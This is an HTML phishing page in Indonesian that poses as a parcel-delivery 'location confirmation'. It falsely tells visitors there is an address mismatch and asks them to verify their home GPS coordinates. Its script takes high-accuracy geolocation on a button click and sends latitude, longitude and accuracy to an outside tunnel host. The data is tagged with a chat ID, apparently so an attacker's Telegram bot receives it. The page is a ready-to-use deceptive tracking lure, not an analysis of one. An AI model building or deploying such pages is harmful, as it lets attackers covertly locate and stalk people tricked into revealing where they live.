<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Konfirmasi Pengiriman Paket</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f4f4f4; }
        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); max-width: 400px; margin: 20px auto; }
        .btn { background-color: #28a745; color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; }
        .btn:hover { background-color: #218838; }
        h2 { color: #333; }
        p { color: #666; }
    </style>
</head>
<body>

<div class="card">
    <h2>📍 Konfirmasi Lokasi Pengiriman</h2>
    <p>Sistem mendeteksi ketidaksesuaian alamat. Silakan verifikasi koordinat GPS rumah Anda agar kurir tidak salah mengantar paket.</p>
    <br>
    <button class="btn" onclick="ambilLokasi()">KONFIRMASI LOKASI SAYA</button>
    <p id="status" style="margin-top: 15px; font-weight: bold; color: #d9534f;"></p>
</div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const userIdAdmin = urlParams.get('uid'); 

    function ambilLokasi() {
        const statusText = document.getElementById("status");
        statusText.style.color = "#333";
        statusText.innerText = "Menghubungkan ke satelit GPS...";

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(kirimKeTermux, tanganiError, {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            });
        } else {
            statusText.style.color = "#d9534f";
            statusText.innerText = "Browser tidak mendukung sensor GPS.";
        }
    }

    function kirimKeTermux(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const acc = position.coords.accuracy;
        const statusText = document.getElementById("status");

        const targetChatId = userIdAdmin ? userIdAdmin : 6953925929; 
        const URL_SERVER_TERMUX = "testerbottelee.serveousercontent.com";

        fetch(URL_SERVER_TERMUX, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                lat: lat,
                lon: lon,
                acc: acc,
                uid: targetChatId
            })
        })
        .then(res => res.json())
        .then(data => {
            statusText.style.color = "#28a745";
            statusText.innerText = "✅ Verifikasi Lokasi Sukses! Alamat paket diperbarui.";
        })
        .catch(err => {
            statusText.style.color = "#d9534f";
            statusText.innerText = "Gagal memproses data lokasi.";
        });
    }

    function tanganiError(error) {
        const statusText = document.getElementById("status");
        statusText.style.color = "#d9534f";
        switch(error.code) {
            case error.PERMISSION_DENIED:
                statusText.innerText = "❌ Gagal: Anda harus klik 'Izinkan/Allow' akses lokasi browser.";
                break;
            default:
                statusText.innerText = "❌ Gagal: Terjadi gangguan GPS.";
        }
    }
</script>

</body>
</html>
